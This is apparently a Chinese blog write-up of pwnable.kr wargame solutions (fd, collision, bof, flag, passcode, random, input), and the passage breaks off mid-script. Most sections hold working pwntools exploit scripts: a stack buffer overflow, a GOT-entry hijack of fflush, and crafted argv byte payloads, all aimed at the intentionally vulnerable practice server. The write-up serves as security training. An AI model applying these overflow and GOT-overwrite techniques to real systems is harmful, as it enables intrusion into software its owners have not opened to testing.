class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload=<span class="built_in">str</span>(<span class="number">0x1234</span>)</span><br><span class="line"></span><br><span class="line">shell=ssh(host=<span class="string">&#x27;pwnable.kr&#x27;</span>,user=<span class="string">&#x27;fd&#x27;</span>,password=<span class="string">&#x27;guest&#x27;</span>,port=<span class="number">2222</span>)</span><br><span class="line"><span class="comment">#shell.download_file(&#x27;fd.c&#x27;)</span></span><br><span class="line">sh = shell.run(<span class="string">&#x27;./fd&#x27;</span>+<span class="string">&#x27; &#x27;</span>+payload)</span><br><span class="line">payload=<span class="string">&quot;LETMEWIN&quot;</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="collision"><a href="#collision" class="headerlink" title="collision"></a>collision</h2><p><strong>Tips:</strong></p><p>跟哈希相关不大（×  可能是我没有get到出题人的意思</p><p>思路很简单，用hashcode的值除以5，再依次加起来就好了。0x21DD09EC的十进制表示是568134124，它并不能被5整除，所以我们用一个小技巧，先加1，再除以5，最后将其中一个数值再减1即可。</p><p>具体计算方法为：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(568134124 + 1) / 5 = 113626825 = 0x6C5CEC9</span><br><span class="line">0x21DD09EC = 0x6C5CEC9 + 0x6C5CEC9 + 0x6C5CEC9 + 0x6C5CEC9 + 0x6C5CEC8</span><br></pre></td></tr></table></figure><p>那么argv[1]的字符串，就应该是一个由相应十六进制数值组成的字符串，表示如下：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc8\xce\xc5\x06</span><br></pre></td></tr></table></figure><p>这里采用小端存储方式。</p><p>小端存储：高字节保存在内存高地址，低字节保存在内存低地址中</p><p>这个解释依旧十分笼统，为什么int型数据以小端存储就要每个int型数据逆序输入</p><p>下面两张图说明问题：（×其实还并不能说明问题</p><p><img src="https://i.loli.net/2021/04/15/tHDIdXazbU4pqE6.png" alt="store.jpg"></p><p><img src="https://i.loli.net/2021/04/15/pg2WPeRi8dcGoOB.png" alt="store2.jpg"></p><p>但是我们并不知道输入的命令行参数在内存存储的增长方向😀</p><p>各种Google均无果。。无奈下手动测试一下。</p><p>Test Code:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[],<span class="keyword">char</span>* env[])</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=<span class="number">2</span>;i++)      </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;argv[%d]:%p\n&quot;</span>,i,argv[i]);</span><br><span class="line">     <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;stack:%p\n&quot;</span>,&amp;i);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;env:%p\n&quot;</span>,env[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>实践出真知: </p><p><img src="https://i.loli.net/2021/04/15/mrwnc4Plt2YR9Na.png" alt="testout.jpg"></p><p>输入的argv[1]存储在栈上和内核空间之间，并且由低地址向高地址增长。</p><p>那么就很容易明白为什么逆序输入int四个字节了。</p><p>以为0x6C5CEC9和0x6C5CEC8为例  我们传入命令行参数argv[1]对应的字节序列为</p><p>\xc9\xce\xc5\x06\x12\x34\x56\x78实际存储时如下方式存储如下：</p><p>高地址8                                      78<br>高地址7                                      56<br>高地址6                                      34<br>高地址5                                      12<br>高地址4                                      06<br>高地址3                                      c5<br>高地址2                                      ce<br>高地址1                                      c9</p><p>int型号指针ip指向高地址1    那么由于int型号为小端存储，四个字节依次读取</p><p>ip[i]=0x06C5CEC9  ip[2]=0x78563412</p><p>网上大部分解析只是简单说明int数据小端存储，但是单单知道这个是不足以得出逆序输入的结论，必须知道命令行参数存储结构。</p><p><strong>以上内容原创。转载注明出处。</strong></p><p>PS：部分字节没有对应ASCII码，我们需要直接向argv[1]中写入字节，可以用python实现</p><p>Demo:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`python -c <span class="built_in">print</span> <span class="string">&#x27;\xAB\xCD&#x27;</span>`</span><br></pre></td></tr></table></figure><p><strong>Exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload=p32(<span class="number">0x6c5cec9</span>)*<span class="number">4</span>+p32(<span class="number">0x6c5cec8</span>)</span><br><span class="line"></span><br><span class="line">shell=ssh(host=<span class="string">&#x27;pwnable.kr&#x27;</span>,user=<span class="string">&#x27;col&#x27;</span>,password=<span class="string">&#x27;guest&#x27;</span>,port=<span class="number">2222</span>)</span><br><span class="line">sh = shell.run(<span class="string">&#x27;./col&#x27;</span>+<span class="string">&#x27; &#x27;</span>+payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h2><p><strong>Analyse:</strong></p><p>get简单的溢出</p><p>IDA静态查看arg[1]和数组key对应的VA地址，计算出偏移为0x52</p><p><strong>Exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&quot;pwnable.kr&quot;</span>,<span class="number">9000</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x2c</span>+<span class="number">0x8</span>)+p32(<span class="number">0xcafebabe</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p><strong>Analyse:</strong></p><p>IDA静态分析发现里面内容少得可怜..很明显是加壳了</p><p>这里需要用到strings命令，一个技巧可以获得关键的信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings  -20 flag</span><br></pre></td></tr></table></figure><p>显示flag文件中至少包含20个字符的字符串，定位关键信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Info: This file is packed with the UPX executable packer http:&#x2F;&#x2F;upx.sf.net</span><br></pre></td></tr></table></figure><p>Google后简单了解了一下upx ，是个压缩壳</p><p>upx -d 解压一下即可</p><p>然后字符搜索关键词字  :)    #注意此处需要转义字符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings flag |grep \:\)</span><br></pre></td></tr></table></figure><h2 id="passcode"><a href="#passcode" class="headerlink" title="passcode"></a>passcode</h2><p><strong>souce code:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">login</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> passcode1;</span><br><span class="line">        <span class="keyword">int</span> passcode2;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;enter passcode1 : &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, passcode1);</span><br><span class="line">        fflush(<span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;enter passcode2 : &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, passcode2);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;checking...\n&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(passcode1==<span class="number">338150</span> &amp;&amp; passcode2==<span class="number">13371337</span>)&#123;<span class="comment">//这个条件一旦成立就可以pwn</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Login OK!\n&quot;</span>);</span><br><span class="line">                system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Login Failed!\n&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">welcome</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> name[<span class="number">100</span>];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;enter you name : &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%100s&quot;</span>, name);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Welcome %s!\n&quot;</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Toddler&#x27;s Secure Login System 1.0 beta.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        welcome();</span><br><span class="line">        login();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// something after login...</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Now I can safely trust you that you have credential :)\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>key points:</strong></p><p>scanf函数:   <code>scanf(&quot;%d&quot;, passcode1);</code> 缺少一个&amp;这时函数执行时，会将passcode1作为地址进行写入操作，同理对应passcode2一样。一旦这两个不可控的地址是不可写或访问的，那么程序就crash了。</p><p>那么对passcode1和2地址的构造，然后利用scanf函数在该地址进行写入数据会是关键。</p><p><strong>Analyse</strong>：</p><p>函数流程分析</p><p>welcome:可以在name数组中写入长度位100字节的字符</p><p>接下来无缝执行</p><p>login： 对passcode1地址上进行写入数据   ➡  调用fflush(stdin);  ➡  输入passcode2  ➡check为真后输出flag</p><p>由于welcome()和login()这两个函数之间执行期间没有其他操作，可以分析得出前后进入这两个栈帧时，他们的EBP是一样的，自然可以想到我们可以领用name数组对passcode1和passcode2进行覆盖。</p><p><strong>IDA静态分析：</strong></p><p><img src="https://i.loli.net/2021/04/18/bqCXoTluzcWj5eL.png" alt="11.jpg"></p><p>name数组数组的地址为：EBP-70H</p><p><img src="https://i.loli.net/2021/04/18/w3GPp4bIgl7ZfcU.png" alt="12.jpg"></p><p>passcode1地址: EBP-10H</p><p>passcode2地址: EBP-0cH</p><p>welcome（）和login（）这两个函数栈帧的EBP一样只是我们的猜测，我们可以用gdb动态调试验证查看是否确实相同。</p><p>下载ELF文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">shell=ssh(host=<span class="string">&#x27;pwnable.kr&#x27;</span>,user=<span class="string">&#x27;passcode&#x27;</span>,password=<span class="string">&#x27;guest&#x27;</span>,port=<span class="number">2222</span>)</span><br><span class="line">shell.download_file(<span class="string">&quot;./passcode&quot;</span>)</span><br></pre></td></tr></table></figure><p>修改权限 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 passcode</span><br></pre></td></tr></table></figure><p>查看内存保护信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checksec passcode</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/18/qwV7mYUtJ6RSXy4.png" alt="13.jpg"></p><p>此处的RELRO信息为关键点，关于checksec 查看内存保护信息参阅这篇：</p><p>linux<a href="https://bupt3xplorer.github.io/2021/04/18/Linux%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/">内存保护信息</a></p><p>gdb动态调试：</p><p><img src="https://i.loli.net/2021/04/18/SFEnUXkT8G7AQsz.png" alt="9.jpg"></p><p><img src="https://i.loli.net/2021/04/18/txQLlR7ynCEM8Yq.png" alt="10.jpg"></p><p>查看验证：确实两个函数栈帧的EBP相同，那么自然想到可以利用name数组对passcode1和2进行覆盖，但是注意到数组name大小是100字节，name首地址到passcode1首地址距离为96，我们组多能利用name数组的最后四个字节覆盖passcode1，无法覆盖到passcode2</p><p>注意到输入passcode1后，立即执行了        fflush(stdin)  【用于更新缓冲区】函数，调用这个函数的时候会利用linux的动态延迟加载。</p><p>此处需要恶补一下GOT和PLT表的关系以及linux动态延迟加载的一些只是：</p><p><a href="https://cloud.tencent.com/developer/article/1590167?from=information.detail.linux%20%E5%8A%A8%E6%80%81%E5%BA%93%20%E5%BB%B6%E8%BF%9F%E5%8A%A0%E8%BD%BD">参考这篇非常详细</a></p><p><img src="https://i.loli.net/2021/04/19/dZJSNBM4QE7P3vx.png" alt="01.png"></p><p><img src="https://i.loli.net/2021/04/19/wVAyNBdLTXqC3fv.png" alt="02.png"></p><p>参阅完毕后就可以进行exp</p><p><strong>Hijack GOT</strong>：  <em>修改某个被调用函数的地址，让其指向另一个函数</em></p><p>这里我们修改调用fflush的地址，改为cat flag指令的地址，然后成功执行cat flag指令得到flag。</p><p>最后要做的就是找到调用fflush的地址和cat flag的地址，然后用name数组对passcode1覆盖为fflush的GOT表项地址，然后用scanf函数对GOT表象覆写为输出flag的指令即可。</p><p><img src="https://i.loli.net/2021/04/18/IaZwJ8Ay9U1Wz5O.png" alt="14.jpg"></p><p>找到fflush的GOT表项地址: 0x0804a004</p><p><img src="https://i.loli.net/2021/04/18/qzux2AWvXYVswIc.png" alt="15.jpg"></p><p>找到cat flag 指令地址为：0x080485E3</p><p>Exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">shell=ssh(host=<span class="string">&#x27;pwnable.kr&#x27;</span>,user=<span class="string">&#x27;passcode&#x27;</span>,password=<span class="string">&#x27;guest&#x27;</span>,port=<span class="number">2222</span>)</span><br><span class="line">sysh_addr=<span class="number">0x080485E3</span></span><br><span class="line">fflush_got=<span class="number">0x0804a004</span></span><br><span class="line">payload=<span class="string">&quot;a&quot;</span>*(<span class="number">100</span>-<span class="number">4</span>)+p32(fflush_got)</span><br><span class="line">sh=shell.run(<span class="string">&#x27;./passcode&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;enter you name :&quot;</span>,payload)</span><br><span class="line">payload=<span class="built_in">str</span>(sysh_addr)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;enter passcode1 :&quot;</span>,payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="random"><a href="#random" class="headerlink" title="random"></a>random</h2><p>一个C语言的知识点：如果用户在rand()之前没有调用过sand(),那么系统默认将1作为伪随机数的初始值，如果给定了一个值，那么每次rand()产生的随机数序列都是一样的。</p><p>EXP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">shell=ssh(host=<span class="string">&#x27;pwnable.kr&#x27;</span>,user=<span class="string">&#x27;random&#x27;</span>,password=<span class="string">&#x27;guest&#x27;</span>,port=<span class="number">2222</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="built_in">str</span>(<span class="number">3039230856</span>)</span><br><span class="line">sh=shell.run(<span class="string">&#x27;./random&#x27;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="input"><a href="#input" class="headerlink" title="input"></a>input</h2><p>主要考察linux的一些基本参数传递，这里就当做学习python的一些模块。。</p><p><strong>subprocess模块</strong></p><p>Demo:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">subprocess.run(args, *, stdin=<span class="literal">None</span>, <span class="built_in">input</span>=<span class="literal">None</span>, stdout=<span class="literal">None</span>, stderr=<span class="literal">None</span>, capture_output=<span class="literal">False</span>, shell=<span class="literal">False</span>, cwd=<span class="literal">None</span>, timeout=<span class="literal">None</span>, check=<span class="literal">False</span>, encoding=<span class="literal">None</span>, errors=<span class="literal">None</span>, text=<span class="literal">None</span>, env=<span class="literal">None</span>, universal_newlines=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure><ul><li>args：表示要执行的命令。必须是一个字符串，字符串参数列表。</li><li>stdin、stdout 和 stderr：子进程的标准输入、输出和错误。其值可以是  subprocess.PIPE、subprocess.DEVNULL、一个已经存在的文件描述符、已经打开的文件对象或者  None。subprocess.PIPE 表示为子进程创建新的管道。subprocess.DEVNULL 表示使用  os.devnull。默认使用的是 None，表示什么都不做。另外，stderr 可以合并到 stdout 里一起输出。</li><li>timeout：设置命令超时时间。如果命令执行时间超时，子进程将被杀死，并弹出 TimeoutExpired 异常。</li><li>check：如果该参数设置为 True，并且进程退出状态码不是 0，则弹 出 CalledProcessError 异常。</li><li>encoding: 如果指定了该参数，则 stdin、stdout 和 stderr 可以接收字符串数据，并以该编码方式编码。否则只接收 bytes 类型的数据。</li><li>shell：如果该参数为 True，将通过操作系统的 shell 执行指定的命令。</li></ul><p><strong>os模块</strong></p><p>该模块提供了一些方便使用操作系统相关功能的函数。 </p><p><strong>fdopen()函数</strong>：创建文件对象</p><p>os.fdopen(<em>fd</em>, **args,<em>\</em>kwargs):返回打开文件描述符 <em>fd</em> 对应文件的对象。类似内建 open() 函数，二者接受同样的参数。不同之处在于 fdopen() 第一个参数应该为整数。</p><p><strong>open()函数：</strong>  打开文件对象</p><p><em>file</em> 是一个 <a href="https://docs.python.org/zh-cn/3.7/glossary.html#term-path-like-object">path-like object</a>，表示将要打开的文件的路径（绝对路径或者当前工作目录的相对路径），也可以是要被封装的整数类型文件描述符。（如果是文件描述符，它会随着返回的 I/O 对象关闭而关闭，除非 <em>closefd</em> 被设为 <code>False</code> 。）</p><p><code>open</code>(<em>file</em>, <em>mode=’r’</em>, <em>buffering=-1</em>, <em>encoding=None</em>, <em>errors=None</em>, <em>newline=None</em>, <em>closefd=True</em>, <em>opener=None</em>)</p><p><em>mode</em> 是一个可选字符串，用于指定打开文件的模式。默认值是 <code>&#39;r&#39;</code>  ，这意味着它以文本模式打开并读取。其他常见模式有：写入 <code>&#39;w&#39;</code> （截断已经存在的文件）；排它性创建 <code>&#39;x&#39;</code> ；追加写 <code>&#39;a&#39;</code> （在 <em>一些</em>  Unix 系统上，无论当前的文件指针在什么位置，<em>所有</em> 写入都会追加到文件末尾）。在文本模式，如果 <em>encoding</em> 没有指定，则根据平台来决定使用的编码：使用 <code>locale.getpreferredencoding(False)</code> 来获取本地编码。（要读取和写入原始字节，请使用二进制模式并不要指定 <em>encoding</em>。）可用的模式有：</p><div class="table-container"><table><thead><tr><th>字符</th><th>含义</th></tr></thead><tbody><tr><td><code>&#39;r&#39;</code></td><td>读取（默认）</td></tr><tr><td><code>&#39;w&#39;</code></td><td>写入，并先截断文件</td></tr><tr><td><code>&#39;x&#39;</code></td><td>排它性创建，如果文件已存在则失败</td></tr><tr><td><code>&#39;a&#39;</code></td><td>写入，如果文件存在则在末尾追加</td></tr><tr><td><code>&#39;b&#39;</code></td><td>二进制模式</td></tr><tr><td><code>&#39;t&#39;</code></td><td>文本模式（默认）</td></tr><tr><td><code>&#39;+&#39;</code></td><td>更新磁盘文件（读取并写入）</td></tr></tbody></table></div><p>默认的模式是 <code>&#39;r&#39;</code> （打开并读取文本，同 <code>&#39;rt&#39;</code> ）。对于二进制写入， <code>&#39;w+b&#39;</code> 模式打开并把文件截断成 0 字节； <code>&#39;r+b&#39;</code> 则不会截断。</p><p><strong>os.pipe()</strong></p><p>创建一个管道，返回一对分别用于读取和写入的文件描述符 <code>(r, w)</code>。</p><p>Demo:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os, sys</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;The child will write text to a pipe and &quot;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;the parent will read the text written by child...&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># file descriptors r, w for reading and writing</span></span><br><span class="line">r, w = os.pipe() </span><br><span class="line"></span><br><span class="line">processid = os.fork()</span><br><span class="line"><span class="keyword">if</span> processid:</span><br><span class="line">    <span class="comment"># This is the parent process </span></span><br><span class="line">    <span class="comment"># Closes file descriptor w</span></span><br><span class="line">    os.close(w)</span><br><span class="line">    r = os.fdopen(r)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Parent reading&quot;</span></span><br><span class="line">    <span class="built_in">str</span> = r.read()</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;text =&quot;</span>, <span class="built_in">str</span>   </span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># This is the child process</span></span><br><span class="line">    os.close(r)</span><br><span class="line">    w = os.fdopen(w, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Child writing&quot;</span></span><br><span class="line">    w.write(<span class="string">&quot;Text written by child...&quot;</span>)</span><br><span class="line">    w.close()</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Child closing&quot;</span></span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p><strong>socket模块</strong></p><p><img src="https://i.loli.net/2021/04/19/myGR9Jws2AlfvFH.png" alt="111.jpg"></p><p>这个模块提供了访问BSD<em>套接字</em>的接口。在所有现代Unix系统、Windows、macOS和其他一些平台上可用。</p><p>这个Python接口是用Python的面向对象风格对Unix系统调用和套接字库接口的直译：函数socket() 返回一个 <em>套接字对象</em> ，其方法是对各种套接字系统调用的实现。形参类型一般与C接口相比更高级：例如在Python文件 <code>read()</code> 和 <code>write()</code> 操作中，接收操作的缓冲区分配是自动的，发送操作的缓冲区长度是隐式的。</p><p>Demo:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socket.socket(socket_family,socket_type,protocal=<span class="number">0</span>)</span><br></pre></td></tr></table></figure><ul><li>family: 套接字家族可以使 AF_UNIX 或者 AF_INET。</li><li>type: 套接字类型可以根据是面向连接的还是非连接分为 <code>SOCK_STREAM</code> 或 <code>SOCK_DGRAM</code>。</li><li>protocol: 一般不填默认为 0。</li></ul><p><strong>socket_family参数：</strong></p><p>1.基于文件类型的套接字家族</p><p>套接字家族的名字：AF_UNIX，unix一切皆文件，基于文件的套接字调用的就是底层的文件系统来取数据，两个套接字进程运行在同一机器，可以通过访问同一个文件系统间接完成通信。</p><p>2.基于网络类型的套接字家族</p><p>套接字家族的名字：AF_INET，还有AF_INET6被用于ipv6，还有一些其他的地址家族，不过，他们要么是只用于某个平台，要么就是已经被废弃，或者是很少被使用，或者是根本没有实现，所有地址家族中，AF_INET是使用最广泛的一个，python支持很多种地址家族，但是由于我们只关心网络编程，所以大部分时候我么只使用AF_INET。</p><p><strong>type指的是套接字类型，常用的类型有：</strong></p><p>SOCK_STREAM（TCP流）</p><p>SOCK_DGRAM（UDP数据报）</p><p>SOCK_RAW（原始套接字）<br>最后一个 <strong>“protocol”一般设置为“0”</strong>，也就是当确定套接字使用的协议簇和类型时，这个参数的值就为0，但是有时候创建原始套接字时，并不知道要使用的协议簇和类型，也就是domain参数未知情况下，这时protocol这个参数就起作用了，它可以确定协议的种类。<br> socket是一个函数，那么它也有返回值，当套接字创建成功时，返回套接字，失败返回“-1”，错误代码则写入“errno”中。</p><p><strong>一些socket函数:</strong></p><p>socket.connect(adress):</p><p>连接到 <em>address</em> 处的远程套接字。<em>address</em> 的格式取决于地址簇)</p><p>socket.send(bytes[,flags])</p><p>发送数据给套接字。本套接字必须已连接到远程套接字。</p><p>socket.close(fd)</p><p>关闭一个套接字文件描述符。它类似于os.close()，但是专用于套接字</p><p>Exp:</p><p>在/temp文件夹发现的python写的exp…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#argc=100</span></span><br><span class="line"><span 